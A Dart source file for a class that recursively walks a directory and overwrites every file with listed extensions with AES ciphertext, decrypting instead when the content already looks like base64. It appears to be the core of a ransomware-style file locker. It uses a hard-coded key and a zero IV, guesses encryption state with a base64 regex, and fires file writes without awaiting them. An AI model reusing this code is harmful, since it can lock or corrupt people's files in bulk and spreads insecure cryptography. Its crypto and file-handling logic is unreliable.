import 'dart:io';
import 'dart:typed_data';
import 'package:encrypt/encrypt.dart';
import 'package:path/path.dart';

import '../util/manipulate_data.dart';
import '../util/config.dart';

class Crypto {
  Crypto();

   static final _key = Key.fromUtf8('oSEBTdO89X5cCTAsW4o4qquLQvgjJEhO');
   static final _iv = IV.fromLength(16);
   static final _encrypter = Encrypter(AES(_key));

   Map<String, dynamic> _mapForResult = {
      "status": null,
      "amountFiles": null,
      "mode": null,
      "error": null
  };

   Future<Map<String, dynamic>> run(String initialPath) async {
    Directory dir = Directory(initialPath);
    return await _discoveryFiles(dir);
  }

   Future<Map<String, dynamic>> _discoveryFiles(Directory dir) async{
    bool status = true;
    int amountFiles = 0;
    String error;
    String mode;

    try {
      var lister = dir.list(recursive: true, followLinks: false);
      List listFiles = await lister.toList(); 
      listFiles.forEach((file){
          if (file.runtimeType.toString() == "_File") {
            String currentNameFile = basename(file.path);
            String currentExtension = currentNameFile.split(".").last;

            if (Config.extensions.contains(currentExtension)) {
              String currentPath = file.path;
              String currentContent = _readFileAsync(currentPath);

              if (_fileIsEncrypted(currentContent)) {
                String plainText = _decrypt(currentContent);
                _writeFileAsync(currentPath, plainText);
                mode = "Decrypt";
              } else {
                String encrypted = _encrypt(currentContent);
                _writeFileAsync(currentPath, encrypted);
                mode = "Encrypt";
              }
              amountFiles += 1;
            }
          }
      });

      _mapForResult["status"] = status;
      _mapForResult["error"] = error;
      _mapForResult["amountFiles"] = amountFiles;
      _mapForResult["mode"] = mode;

      return _mapForResult; 
    } catch (_er) {
        _mapForResult["status"] = false;
        _mapForResult["error"] = _er.toString();
        _mapForResult["amountFiles"] = 0;
        return _mapForResult;
    }
  }

   String _readFileAsync(String path){
    File file = File(path);
    Uint8List futureContent = file.readAsBytesSync();
    return ManipulateData.convertCharCodesToString(futureContent);
  }
 
   void _writeFileAsync(String path, String content) async {
    File file = File(path);
    Uint8List bytes = ManipulateData.convertStringToCharCodes(content);
    await file.writeAsBytes(bytes).catchError((error) {
      print(error.toString());
    });
  }

   bool _fileIsEncrypted(String content) {
    RegExp regExp = new RegExp(
      r"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$",
      caseSensitive: false,
      multiLine: false,
    );
    bool isEncypted = regExp.hasMatch(content);
    return isEncypted;
  }

   String _encrypt(String plainText) {
    final encrypted = _encrypter.encrypt(plainText, iv: _iv);
    return encrypted.base64;
  }

   String _decrypt(String contentEncrypted) {
    String decrypted = _encrypter.decrypt64(contentEncrypted, iv: _iv);
    return decrypted;
  }
}
